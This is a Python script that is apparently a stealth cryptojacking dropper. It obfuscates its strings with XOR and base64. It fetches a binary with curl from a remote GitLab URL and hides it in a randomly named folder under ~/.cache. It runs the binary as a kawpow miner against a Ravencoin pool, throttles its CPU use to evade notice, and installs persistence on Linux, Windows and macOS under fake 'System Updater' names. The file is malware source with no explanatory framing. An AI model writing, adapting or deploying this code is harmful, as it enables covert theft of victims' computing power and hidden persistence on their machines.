import subprocess
import os
import sys
import time
import base64
import platform
import random
import tarfile
import shutil
import string
import threading
import signal

try:
    import psutil
except ImportError:
    try:
        if shutil.which("pip"):
            subprocess.run([sys.executable, "-m", "pip", "install", "psutil"], check=True)
        else:
            sys.exit(1)
        import psutil
    except (subprocess.CalledProcessError, FileNotFoundError) as e:
        sys.exit(1)

COMPLEX_XOR_KEY = [0x5A, 0x3C, 0xF8, 0x1B, 0x7E, 0x9D, 0x24]

def advanced_obfuscate_string(s):
    encoded_bytes = s.encode('utf-8')
    key_length = len(COMPLEX_XOR_KEY)
    xored_bytes = bytes([encoded_bytes[i] ^ COMPLEX_XOR_KEY[i % key_length] for i in range(len(encoded_bytes))])
    return base64.b64encode(xored_bytes).decode('utf-8')

def advanced_unobfuscate_string(s):
    decoded_bytes = base64.b64decode(s)
    key_length = len(COMPLEX_XOR_KEY)
    xored_bytes = bytes([decoded_bytes[i] ^ COMPLEX_XOR_KEY[i % key_length] for i in range(len(decoded_bytes))])
    return xored_bytes.decode('utf-8')

DOWNLOAD_URL_ENCODED = advanced_obfuscate_string("https://gitlab.com/kenogoden/main/-/raw/main/sh/google")
DOWNLOADED_FILENAME_ENCODED = advanced_obfuscate_string("google")
ORIGINAL_EXECUTABLE_NAME_ENCODED = advanced_obfuscate_string("google")

SERVICE_ALGORITHM_ENCODED = advanced_obfuscate_string("kawpow")
STEALTH_SERVER_ENCODED = advanced_obfuscate_string("localhost:8080")
ACTUAL_SERVER_ENCODED = advanced_obfuscate_string("stratum+tcp://rvn.kryptex.network:7031")
SERVICE_USER_ENCODED = advanced_obfuscate_string("krxXJMWJKW")
SERVICE_PASS_ENCODED = advanced_obfuscate_string("CUAN")

CURL_COMMAND_ENCODED = advanced_obfuscate_string("curl")
CURL_SILENT_ENCODED = advanced_obfuscate_string("-s")
CURL_REDIRECT_ENCODED = advanced_obfuscate_string("-L")
CURL_OUTPUT_ENCODED = advanced_obfuscate_string("-o")
TAR_COMMAND_ENCODED = advanced_obfuscate_string("tar")
TAR_FLAGS_ENCODED = advanced_obfuscate_string("zxvf")
TAR_EXTRACT_DIR_ENCODED = advanced_obfuscate_string("-C")
CRONTAB_COMMAND_ENCODED = advanced_obfuscate_string("crontab")
CRONTAB_LIST_ENCODED = advanced_obfuscate_string("-l")
CRONTAB_EDIT_ENCODED = advanced_obfuscate_string("-")
PYTHON_CMD_ENCODED = advanced_obfuscate_string("python3")
SCHTASKS_COMMAND_ENCODED = advanced_obfuscate_string("schtasks")
CREATE_FLAG_ENCODED = advanced_obfuscate_string("/Create")
TASKNAME_FLAG_ENCODED = advanced_obfuscate_string("/TN")
SCHEDULE_FLAG_ENCODED = advanced_obfuscate_string("/SC")
SCHEDULE_ONSTART_ENCODED = advanced_obfuscate_string("ONSTART")
TASK_RUN_FLAG_ENCODED = advanced_obfuscate_string("/TR")

def download_file(url, filename):
    try:
        curl_cmd = advanced_unobfuscate_string(CURL_COMMAND_ENCODED)
        curl_redirect_flag = advanced_unobfuscate_string(CURL_REDIRECT_ENCODED)
        curl_output_flag = advanced_unobfuscate_string(CURL_OUTPUT_ENCODED)
        subprocess.run([curl_cmd, curl_redirect_flag, url, curl_output_flag, filename], check=True)
        return True
    except (FileNotFoundError, subprocess.CalledProcessError) as e:
        return False

def generate_random_string(length):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def setup_files():
    download_url = advanced_unobfuscate_string(DOWNLOAD_URL_ENCODED)
    downloaded_filename = advanced_unobfuscate_string(DOWNLOADED_FILENAME_ENCODED)
    stealthy_executable_name = generate_random_string(15)
    random_dir_name = generate_random_string(10)
    executable_directory = os.path.join(os.path.expanduser("~"), f".cache/.sys_services/.{random_dir_name}")
    os.makedirs(executable_directory, exist_ok=True)
    temp_download_path = os.path.join(executable_directory, downloaded_filename)
    if not download_file(download_url, temp_download_path):
        return None, None
    stealthy_executable_path = os.path.join(executable_directory, stealthy_executable_name)
    os.rename(temp_download_path, stealthy_executable_path)
    os.chmod(stealthy_executable_path, 0o777)
    return stealthy_executable_path, executable_directory

def resource_management_and_throttling(pid, cpu_threshold=20, check_interval=10, throttle_duration=5):
    try:
        process = psutil.Process(pid)
        while True:
            cpu_percent = process.cpu_percent(interval=1.0)
            if cpu_percent > cpu_threshold:
                process.suspend()
                time.sleep(throttle_duration)
                process.resume()
            time.sleep(random.uniform(check_interval, check_interval + 5))
    except psutil.NoSuchProcess:
        pass
    except Exception as e:
        pass

def start_service(executable_path):
    service_algorithm = advanced_unobfuscate_string(SERVICE_ALGORITHM_ENCODED)
    service_server = advanced_unobfuscate_string(ACTUAL_SERVER_ENCODED)
    service_user = advanced_unobfuscate_string(SERVICE_USER_ENCODED)
    service_pass = advanced_unobfuscate_string(SERVICE_PASS_ENCODED)
    if not service_server or not os.path.exists(executable_path):
        return None
    service_command = [
        executable_path,
        "-a", service_algorithm,
        "-w", service_user,
        "-p", service_server,
        "-r", service_pass
    ]
    try:
        env = os.environ.copy()
        with open(os.devnull, 'w') as null_file:
            proc = subprocess.Popen(service_command, stdout=null_file, stderr=null_file, env=env)
        throttling_thread = threading.Thread(target=resource_management_and_throttling, args=(proc.pid,))
        throttling_thread.daemon = True
        throttling_thread.start()
        return proc
    except (FileNotFoundError, Exception) as e:
        return None

def implement_persistence(executable_path):
    os_name = platform.system()
    if '__file__' in locals() or '__file__' in globals():
        current_script_path = os.path.abspath(__file__)
    else:
        current_script_path = os.path.abspath(sys.argv[0])
    if os_name == "Linux":
        autostart_dir = os.path.expanduser("~/.config/autostart")
        if not os.path.exists(autostart_dir):
            os.makedirs(autostart_dir)
        desktop_file_path = os.path.join(autostart_dir, "sys-updater.desktop")
        desktop_file_content = f"""[Desktop Entry]
Type=Application
Name=System Updater
Exec=/usr/bin/python3 {current_script_path}
Comment=System startup service.
Terminal=false
Hidden=true
X-GNOME-Autostart-enabled=true
"""
        try:
            with open(desktop_file_path, "w") as f:
                f.write(desktop_file_content)
        except Exception as e:
            if shutil.which("crontab"):
                python_cmd = advanced_unobfuscate_string(PYTHON_CMD_ENCODED)
                crontab_cmd = advanced_unobfuscate_string(CRONTAB_COMMAND_ENCODED)
                crontab_list_flag = advanced_unobfuscate_string(CRONTAB_LIST_ENCODED)
                crontab_edit_flag = advanced_unobfuscate_string("-")
                cron_command = f"@reboot {python_cmd} {current_script_path} > /dev/null 2>&1\n"
                try:
                    p = subprocess.run([crontab_cmd, crontab_list_flag], capture_output=True, text=True, check=True)
                    crontab_content = p.stdout
                    if cron_command not in crontab_content:
                        new_crontab = crontab_content + cron_command
                        subprocess.run([crontab_cmd, crontab_edit_flag], input=new_crontab, text=True, check=True)
                except (subprocess.CalledProcessError, FileNotFoundError) as e:
                    pass
    elif os_name == "Windows":
        schtasks_cmd = advanced_unobfuscate_string(SCHTASKS_COMMAND_ENCODED)
        create_flag = advanced_unobfuscate_string("/Create")
        taskname_flag = advanced_obfuscate_string("/TN")
        taskname = "SysUpdaterTask"
        schedule_flag = advanced_unobfuscate_string("/SC")
        schedule_onstart = advanced_unobfuscate_string("ONSTART")
        task_run_flag = advanced_unobfuscate_string("/TR")
        task_command = f"pythonw.exe \"{current_script_path}\""
        try:
            subprocess.run([schtasks_cmd, create_flag, taskname_flag, taskname, schedule_flag, schedule_onstart, task_run_flag, task_command], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            try:
                import winreg
                key = winreg.HKEY_CURRENT_USER
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
                    command = f"pythonw.exe \"{current_script_path}\""
                    winreg.SetValueEx(reg_key, "SysUpdater", 0, winreg.REG_SZ, command)
            except ImportError:
                pass
            except Exception as e:
                pass
    elif os_name == "Darwin":
        plist_content = f"""
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.sys.updater</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>{current_script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
"""
        plist_path = os.path.expanduser("~/Library/LaunchAgents/com.sys.updater.plist")
        try:
            with open(plist_path, "w") as f:
                f.write(plist_content)
            subprocess.run(['launchctl', 'load', '-w', plist_path], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            pass

def cleanup_files(executable_directory):
    try:
        if os.path.exists(executable_directory):
            shutil.rmtree(executable_directory)
    except Exception as e:
        pass

def terminate_service(proc):
    if proc:
        try:
            if platform.system() == "Windows":
                proc.terminate()
            else:
                os.kill(proc.pid, signal.SIGTERM)
            proc.wait(timeout=10)
        except (psutil.NoSuchProcess, subprocess.TimeoutExpired) as e:
            proc.kill()
        except Exception as e:
            pass

if __name__ == "__main__":
    TOTAL_DURATION = 6 * 60 * 60
    start_time = time.time()
    while time.time() - start_time < TOTAL_DURATION:
        executable_path, executable_directory = setup_files()
        if executable_path:
            service_proc = start_service(executable_path)
            implement_persistence(executable_path)
            run_duration = 10 * 60
            time.sleep(run_duration)
            terminate_service(service_proc)
        cleanup_files(executable_directory)
        wait_duration = 5 * 60
        time.sleep(wait_duration)
